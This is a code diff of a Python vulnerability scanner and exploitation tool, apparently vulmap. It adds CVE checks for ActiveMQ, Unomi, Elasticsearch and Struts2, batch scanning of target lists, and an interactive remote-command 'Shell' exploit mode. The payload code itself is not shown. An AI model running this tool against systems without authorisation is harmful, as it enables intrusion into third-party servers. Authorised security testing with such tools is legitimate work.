                 verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
         except socket.timeout as error:
@@ -13646,8 +13922,8 @@ class OracleWeblogic():
         try:
             self.request = requests.post(self.url + self.path, data=self.payload, headers=self.headers,
                                          timeout=TIMEOUT, verify=False)
-            self.request = requests.post(self.url + self.path, data=self.payload, headers=self.headers,
-                                         timeout=TIMEOUT, verify=False)
+            #self.request = requests.post(self.url + self.path, data=self.payload, headers=self.headers,
+            #                             timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
             verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
@@ -14005,31 +14281,44 @@ class Start(object):
             print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Start scan target: " + str(url)))
             if OUTPUT is not None:
                 print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Scan results output to: " + OUTPUT))
-                verify.file_output("########## " + str(url) + " ##########")
+                verify.text_output("[*] " + str(url))
                 
     def onepoc_output(self):
         if RUNALLPOC == True:
             pass
         else:
-            print(now.timed(de=0) + color.yeinfo() + color.yellow(" Scan completed and ended"))
+            print(now.timed(de=0) + color.yeinfo() + color.yellow(" Scan completed and ended                        "))
     def allvulnscan(self):
         print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Start scan target: " + str(self)))
         print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Use all vuln poc"))
+        if OUTPUT is not None:
+            print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Scan results output to: " + OUTPUT))
+            verify.text_output("[*] " + str(self))
+        Start.apache_activemq(self)
         Start.apache_shiro(self)
         Start.apache_solr(self)
         Start.apache_strtus2(self)
         Start.apache_tomcat(self)
+        Start.apache_unomi(self)
         Start.drupal(self)
+        Start.elasticsearch(self)
         Start.jenkins(self)
         Start.nexus(self)
         Start.oracle_weblogic(self)
         Start.redhat_jboss(self)
         Start.thinkphp(self)
-        print(now.timed(de=0) + color.yeinfo() + color.yellow(" Scan completed and ended"))
+        print(now.timed(de=0) + color.yeinfo() + color.yellow(" Scan completed and ended                        "))
+    def apache_activemq(self):
+        Start.output(self)
+        PocApacheActiveMQ=ApacheActiveMQ(self)
+        PocApacheActiveMQ.cve_2015_5254()
+        PocApacheActiveMQ.cve_2016_3088()
+        Start.onepoc_output(self)
     def apache_shiro(self):
         Start.output(self)
         PocApacheShiro=ApacheShiro(self)
         PocApacheShiro.cve_2016_4437()
+        Start.onepoc_output(self)
     def apache_solr(self):
         Start.output(self)
         PocApacheSolr=ApacheSolr(self)
@@ -14054,6 +14343,7 @@ class Start(object):
         PocApacheStruts2.s2_052()
         PocApacheStruts2.s2_057()
         PocApacheStruts2.s2_059()
+        PocApacheStruts2.s2_061()
         PocApacheStruts2.s2_devMode()
         Start.onepoc_output(self)
     def apache_tomcat(self):
@@ -14063,12 +14353,23 @@ class Start(object):
         PocApacheTomcat.cve_2017_12615()
         PocApacheTomcat.cve_2020_1938()
         Start.onepoc_output(self)
+    def apache_unomi(self):
+        Start.output(self)
+        PocApacheUnomi=ApacheUnomi(self)
+        PocApacheUnomi.cve_2020_13942()
+        Start.onepoc_output(self)
     def drupal(self):
         Start.output(self)
         PocDrupal = Drupal(self)
         PocDrupal.cve_2018_7600()
         PocDrupal.cve_2018_7602()
         PocDrupal.cve_2019_6340()
+        Start.onepoc_output(self)
+    def elasticsearch(self):
+        Start.output(self)
+        PocElasticsearch = Elasticsearch(self)
+        PocElasticsearch.cve_2014_3120()
+        PocElasticsearch.cve_2015_1427()
         Start.onepoc_output(self)
     def jenkins(self):
         Start.output(self)
@@ -14102,21 +14403,26 @@ class Start(object):
         PocRedHatJBoss.cve_2010_0738()
         PocRedHatJBoss.cve_2010_1428()
         PocRedHatJBoss.cve_2015_7501()
+        Start.onepoc_output(self)
     def thinkphp(self):
         Start.output(self)
         PocThinkPHP = ThinkPHP(self)
         PocThinkPHP.cve_2018_20062()
         PocThinkPHP.cve_2019_9082()
+        Start.onepoc_output(self)
 
     def exploit(self, vuln):
         global VULN
         VULN = vuln
         global CMD
+        ExpApacheActiveMQ = ApacheActiveMQ(self)
         ExpApacheShiro = ApacheShiro(self)
         ExpApacheSolr = ApacheSolr(self)
-        ExpApacheTomcat = ApacheTomcat(self)
         ExpApacheStruts2 = ApacheStruts2(self)
+        ExpApacheTomcat = ApacheTomcat(self)
+        ExpApacheUnomi = ApacheUnomi(self)
         ExpDrupal = Drupal(self)
+        ExpElasticsearch = Elasticsearch(self)
         ExpJenkins = Jenkins(self)
         ExpNexus = Nexus(self)
         ExpOracleWeblogic = OracleWeblogic(self)
@@ -14204,6 +14510,9 @@ class Start(object):
                     CMD = input(now.no_color_timed(de=DELAY)+"[+] Shell >>> ")
                 if CMD == "exit" or CMD == "quit" or CMD == "bye": 
                     exit(0)
+                # Apache ActiveMQ =========================
+                elif VULN == "CVE-2016-3088":
+                    ExpApacheActiveMQ.cve_2016_3088()
                 # Apache Shiro ============================
                 elif VULN == "CVE-2016-4437":
                     ExpApacheShiro.cve_2016_4437()
@@ -14243,16 +14552,26 @@ class Start(object):
                     ExpApacheStruts2.s2_057()
                 elif VULN == "S2-059":
                     ExpApacheStruts2.s2_059()
+                elif VULN == "S2-061":
+                    ExpApacheStruts2.s2_061()
                 elif VULN == "S2-devMode":
                     ExpApacheStruts2.s2_devMode()
                 # Apache Tomcat ===========================
                 elif VULN == "CVE-2017-12615":
                     ExpApacheTomcat.cve_2017_12615()
+                # Apache Unomi ============================
+                elif VULN == "CVE-2020-13942":
+                    ExpApacheUnomi.cve_2020_13942()
                 # Drupal ==================================
                 elif VULN == "CVE-2018-7600":
                     ExpDrupal.cve_2018_7600()
                 elif VULN == "CVE-2019-6340":
                     ExpDrupal.cve_2019_6340()
+                # Elasticsearch ===========================
+                elif VULN == "CVE-2014-3120":
+                    ExpElasticsearch.cve_2014_3120()
+                elif VULN == "CVE-2015-1427":
+                    ExpElasticsearch.cve_2015_1427()
                 # Jenkins =================================
                 elif VULN == "CVE-2018-1000861":
                     ExpJenkins.cve_2018_1000861()
@@ -14303,28 +14622,144 @@ class Target:
     def allvuln_url(self):
         Start.allvulnscan(self)
     def allvuln_file(self):
+        if OUTPUT is not None:
+            print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Scan results output to: " + OUTPUT))
         with open(self) as f:
+            while True:
+                furl = f.readline()
+                furl = furl.strip('\r\n')
+                furl = furl.strip()
+                furl = url_check(furl)
+                if not furl:
+                    break
+                if OUTPUT is not None:
+                    verify.text_output("[*] " + str(furl))
+                survival = survival_check(furl)
+                if survival == "f":
+                    print(now.timed(de=0) + color.rewarn() + color.red(" " + furl + " Survival check failed"))
+                    continue
+                else:
+                    print(now.timed(de=DELAY) + color.yeinfo() + color.yellow(" ========== Batch target =========="))
+                    print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Start scan target: " + furl))
+                Start.apache_activemq(furl)
+                Start.apache_shiro(furl)
+                Start.apache_solr(furl)
+                Start.apache_strtus2(furl)
+                Start.apache_tomcat(furl)
+                Start.apache_unomi(furl)
+                Start.drupal(furl)
+                Start.elasticsearch(furl)
+                Start.jenkins(furl)
+                Start.nexus(furl)
+                Start.oracle_weblogic(furl)
+                Start.redhat_jboss(furl)
+                Start.thinkphp(furl)
+        print(now.timed(de=0) + color.yeinfo() + color.yellow(" Batch scan completed and ended                       "))
+
+    def webapps_url(self, webapps):
+        print(now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run " + webapps + " vulnerability scan"))
+        if webapps == "activemq":
+            Start.apache_activemq(self)
+        elif webapps == "shiro":
+            Start.apache_shiro(self)
+        elif webapps == "solr":
+            Start.apache_solr(self)
+        elif webapps == "struts2":
+            Start.apache_strtus2(self)
+        elif webapps == "tomcat":
+            Start.apache_tomcat(self)
+        elif webapps == "unomi":
+            Start.apache_unomi(self)
+        elif webapps == "deupal":
+            Start.drupal(self)
+        elif webapps == "elasticsearch":
+            Start.elasticsearch(self)
+        elif webapps == "jenkins":
+            Start.jenkins(self)
+        elif webapps == "nexus":
+            Start.nexus(self)
+        elif webapps == "weblogic":
+            Start.oracle_weblogic(self)
+        elif webapps == "jboss":
+            Start.redhat_jboss(self)
+        elif webapps == "thinkphp":
+            Start.thinkphp(self)
+        else:
+            print(now.timed(de=DELAY) + color.rewarn() + color.red(" The webapps are not supported"))
+            sys.exit(0)
+
+    def webapps_file(self, webapps):
+        if OUTPUT is not None:
+            print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Scan results output to: " + OUTPUT))
+        with open(self) as f:
+            print(now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run " + webapps + " vulnerability scan"))
+            while True:
+                furl = f.readline()
+                furl = furl.strip('\r\n')
+                furl = furl.strip()
+                furl = url_check(furl)
+                if not furl:
+                    break
+                if OUTPUT is not None:
+                    verify.text_output("[*] " + str(furl))
+                survival = survival_check(furl)
+                if survival == "f":
+                    print(now.timed(de=0) + color.rewarn() + color.red(" " + furl + " Survival check failed"))
+                    continue
+
+                if webapps == "activemq":
+                    Start.apache_activemq(furl)
+                elif webapps == "shiro":
+                    Start.apache_shiro(furl)
+                elif webapps == "solr":
+                    Start.apache_solr(furl)
+                elif webapps == "struts2":
+                    Start.apache_strtus2(furl)
+                elif webapps == "tomcat":
+                    Start.apache_tomcat(furl)
+                elif webapps == "unomi":
+                    Start.apache_unomi(furl)
+                elif webapps == "deupal":
+                    Start.drupal(furl)
+                elif webapps == "elasticsearch":
+                    Start.elasticsearch(furl)
+                elif webapps == "jenkins":
+                    Start.jenkins(furl)
+                elif webapps == "nexus":
+                    Start.nexus(furl)
+                elif webapps == "weblogic":
+                    Start.oracle_weblogic(furl)
+                elif webapps == "jboss":
+                    Start.redhat_jboss(furl)
+                elif webapps == "thinkphp":
+                    Start.thinkphp(furl)
+                else:
+                    print(now.timed(de=DELAY)+color.rewarn()+color.red(" The webapps are not supported"))
+                    sys.exit(0)
+
+
+
+
+    # Apache ActiveMQ =====================================
+    def apache_activemq_url(self):
+        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache ActiveMQ vulnerability scan"))
+        Start.apache_activemq(self)
+    def apache_activemq_file(self):
+        with open(self) as f:
+            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache ActiveMQ vulnerability scan"))
             while True:
                 furl = f.readline()
                 furl = furl.strip('\r\n')
                 furl = furl.strip()
                 if not furl:
                     break
-                else:
-                    print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" ========== Batch target =========="))
-                Start.apache_shiro(furl)
-                Start.apache_solr(furl)
-                Start.apache_strtus2(furl)
-                Start.apache_tomcat(furl)
-                Start.drupal(furl)
-                Start.jenkins(furl)
-                Start.nexus(furl)
-                Start.oracle_weblogic(furl)
-                Start.redhat_jboss(furl)
-                Start.thinkphp(furl)
-        print(now.timed(de=0) + color.yeinfo() + color.yellow(" Batch scan completed and ended"))
+                if furl[-1] == "/":
+                    furl = furl[:-1]
+                Start.apache_activemq(furl)
+
     # Apache Shiro ========================================
     def apache_shiro_url(self):
+        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Shiro vulnerability scan"))
         Start.apache_shiro(self)
     def apache_shiro_file(self):
         with open(self) as f:
@@ -14340,6 +14775,7 @@ class Target:
                 Start.apache_shiro(furl)
     # Apache Solr =========================================
     def apache_solr_url(self):
+        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Solr vulnerability scan"))
         Start.apache_solr(self)
     def apache_solr_file(self):
         with open(self) as f:
@@ -14355,6 +14791,7 @@ class Target:
                 Start.apache_solr(furl)
     # Apache Struts2 ======================================
     def apache_struts2_url(self):
+        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Struts2 vulnerability scan"))
         Start.apache_strtus2(self)
     def apache_struts2_file(self):
         with open(self) as f:
@@ -14370,6 +14807,7 @@ class Target:
                 Start.apache_strtus2(furl)
     # Apache Tomcat =======================================
     def apache_tomcat_url(self):
+        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Tomcat vulnerability scan"))
         Start.apache_tomcat(self)
     def apache_tomcat_file(self):
         with open(self) as f:
@@ -14383,8 +14821,25 @@ class Target:
                 if furl[-1] == "/":
                     furl = furl[:-1]
                 Start.apache_tomcat(furl)
+    # Apache Unomi ========================================
+    def apache_unomi_url(self):
+        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Tomcat vulnerability scan"))
+        Start.apache_unomi(self)
+    def apache_unomi_file(self):
+        with open(self) as f:
+            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Tomcat vulnerability scan"))
+            while True:
+                furl = f.readline()
+                furl = furl.strip('\r\n')
+                furl = furl.strip()
+                if not furl:
+                    break
+                if furl[-1] == "/":
+                    furl = furl[:-1]
+                Start.apache_unomi(furl)
     # Drupal ==============================================
     def drupal_url(self):
+        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Drupal vulnerability scan"))
         Start.drupal(self)
     def drupal_file(self):
         with open(self) as f:
@@ -14398,8 +14853,25 @@ class Target:
                 if furl[-1] == "/":
                     furl = furl[:-1]
                 Start.drupal(furl)
+    # Elasticsearch =======================================
+    def elasticsearch_url(self):
+        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Elasticsearch vulnerability scan"))
+        Start.elasticsearch(self)
+    def elasticsearch_file(self):
+        with open(self) as f:
+            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Elasticsearch vulnerability scan"))
+            while True:
+                furl = f.readline()
+                furl = furl.strip('\r\n')
+                furl = furl.strip()
+                if not furl:
+                    break
+                if furl[-1] == "/":
+                    furl = furl[:-1]
+                Start.elasticsearch(furl)
     # Jenkins =============================================
     def jenkins_url(self):
+        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Jenkins vulnerability scan"))
         Start.jenkins(self)
     def jenkins_file(self):
         with open(self) as f:
@@ -14415,6 +14887,7 @@ class Target:
                 Start.jenkins(furl)
     # Nexus ===============================================
     def nexus_url(self):
+        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Nexus vulnerability scan"))
         Start.nexus(self)
     def nexus_file(self):
         with open(self) as f:
@@ -14430,12 +14903,12 @@ class Target:
                 Start.nexus(furl)
     # Oracle Weblogic ====================================
     def oracle_weblogic_url(self):
+        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Oracle Weblogic vulnerability scan"))
         Start.oracle_weblogic(self)
     def oracle_weblogic_file(self):
         with open(self) as f:
             print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Oracle Weblogic vulnerability scan"))
             while True:
-                
                 furl = f.readline()
                 furl = furl.strip('\r\n')
                 furl = furl.strip()
@@ -14446,6 +14919,7 @@ class Target:
                 Start.oracle_weblogic(furl)
     # RedHat Jboss ========================================
     def redhat_jboss_url(self):
+        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run RedHat JBoss vulnerability scan"))
         Start.redhat_jboss(self)
     def redhat_jboss_file(self):
         with open(self) as f:
@@ -14461,6 +14935,7 @@ class Target:
                 Start.redhat_jboss(furl)
     # ThinkPHP ============================================
     def thinkphp_url(self):
+        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run ThinkPHP vulnerability scan"))
         Start.thinkphp(self)
     def thinkphp_file(self):
         with open(self) as f:
@@ -14477,7 +14952,7 @@ class Target:
 
 
 def version():
-    version = "0.3"
+    version = "0.4"
     github_ver_url = "https://github.com/zhzyker/vulmap/blob/main/version"      
     try:
         github_ver_request = requests.get(url=github_ver_url, timeout=5)
@@ -14500,6 +14975,30 @@ def os_check():
         return "linux"
     else:
         return "other"
+
+def url_check(url):
+    try:
+        if url[-1] == "/":
+            url = url[:-1]
+            return url
+        if r"http://" not in url and r"https://" not in url:
+            if r"443" in url:
+                url = "https://" + url
+                return url
+            else:
+                url = "http://" + url
+                return url
+            # print(now.timed(de=0) + color.rewarn() + color.red(" URL format error. Examples \"http://example.com\""))
+            # sys.exit(0)
+    except:
+        pass
+
+def survival_check(url):
+    try:
+        r = requests.get(url, timeout=TIMEOUT, verify=False)
+        return "s"
+    except:
+        return "f"
 
 def cmdlineparser(argv=None):
     print(color.yellow("""                   __
@@ -14570,7 +15069,7 @@ def cmdlineparser(argv=None):
                         help="text mode export (e.g. -o \"result.txt\")")
     support = parser.add_argument_group("support")
     support.add_argument(dest="types of vulnerability scanning:\n  "
-                              "shiro, solr, struts2, tomcat, drupal, nexus, weblogic, jboss, thinkphp",
+                              "activemq, shiro, solr, struts2, tomcat, unomi, drupal, elasticsearch, nexus, weblogic, jboss, thinkphp",
                          action='store_false')
     example = parser.add_argument_group("examples")
     example.add_argument(dest="python3 vulmap.py -u http://example.com\n  "
@@ -14596,18 +15095,12 @@ def cmdlineparser(argv=None):
     CMD = args.cmd
     global RUNALLPOC
     RUNALLPOC = False
-    
     # check url format
-    try:
-        if args.url[-1] == "/":
-            args.url = args.url[:-1]
-        if r"http://" not in args.url and r"https://" not in args.url:
-            print(now.timed(de=0) + color.rewarn() + color.red(" URL format error. Examples \"http://example.com\""))
-            sys.exit(0)
-    except:
-        pass
-        # print(now.timed(de=0) + color.rewarn() + color.red(" Example: python3 vulmap.py -u http://example.com"))
-
+    args.url = url_check(args.url)
+    survival = survival_check(args.url)
+    #if survival == "f":
+    #    print(now.timed(de=0) + color.rewarn() + color.red(" "+str(args.url) +" Survival check failed"))
+    #    sys.exit(0)
     if args.list is False:
         print(now.timed(de=0) + color.yeinfo() + color.yellow(" List of supported vulnerabilities"))
         print(vulnlist)
@@ -14617,59 +15110,26 @@ def cmdlineparser(argv=None):
         print (now.timed(de=DELAY)+color.rewarn()+color.red(" Custom command mode, cannot detect normally, please check manually"))
     if args.mode==None or args.mode=="poc":
         if args.debug is False:
-            print (now.timed(de=DELAY)+color.yeinfo()+color.cyan(" Use debug mode... ..."))
+            print (now.timed(de=DELAY)+color.yeinfo()+color.yellow(" Use debug mode!!!"))
             DEBUG = "debug"
         if args.url is not None and args.file is None:
-            #if args.url[-1] == "/":
-            #    args.url = args.url[:-1]
-            if args.app == None:
+            # -u 模式检测一个URL
+            if args.app == None or args.app == "all":
                 RUNALLPOC = True
                 Target.allvuln_url(args.url)
-            elif args.app == "shiro":
-                Target.apache_shiro_url(args.url)
-            elif args.app == "solr":
-                Target.apache_solr_url(args.url)
-            elif args.app == "struts2":
-                Target.apache_struts2_url(args.url)
-            elif args.app == "tomcat":
-                Target.apache_tomcat_url(args.url)
-            elif args.app == "drupal":
-                Target.drupal_url(args.url)
-            elif args.app == "jenkins":
-                Target.jenkins_url(args.url)
-            elif args.app == "weblogic":
-                Target.oracle_weblogic_url(args.url)
-            elif args.app == "nexus":
-                Target.nexus_url(args.url)
-            elif args.app == "jboss":
-                Target.redhat_jboss_url(args.url)
-            elif args.app == "thinkphp":
-                Target.thinkphp_url(args.url)
+            else:
+                Target.webapps_url(args.url, args.app)
         elif args.file is not None and args.url is None:
-            if args.app == None:
+            # -f 模式检测批量URL
+            if args.app == None or args.app == "all":
                 RUNALLPOC = True
                 Target.allvuln_file(args.file)
-            elif args.app == "shiro":
-                Target.apache_shiro_file(args.file)
-            elif args.app == "solr":
-                Target.apache_solr_file(args.file)
-            elif args.app == "struts2":
-                Target.apache_struts2_file(args.file)
-            elif args.app == "tomcat":
-                Target.apache_tomcat_file(args.file)
-            elif args.app == "drupal":
-                Target.drupal_file(args.file)
-            elif args.app == "jenkins":
-                Target.jenkins_file(args.file)
-            elif args.app == "weblogic":
-                Target.oracle_weblogic_file(args.file)
-            elif args.app == "nexus":
-                Target.nexus_file(args.file)
-            elif args.app == "jboss":
-                Target.redhat_jboss_file(args.file)
-            elif args.app == "thinkphp":
-                Target.thinkphp_file(args.file)
+            else:
+                Target.webapps_file(args.file, args.app)
     elif VULN is not None or args.mode=="exp":
+        if args.debug is False:
+            print(now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Use debug mode!!!"))
+            DEBUG = "debug"
         Start.exploit(args.url, args.vuln)
     else:
         print(now.timed(de=0) + color.rewarn() + color.red(" Options error ... ..."))
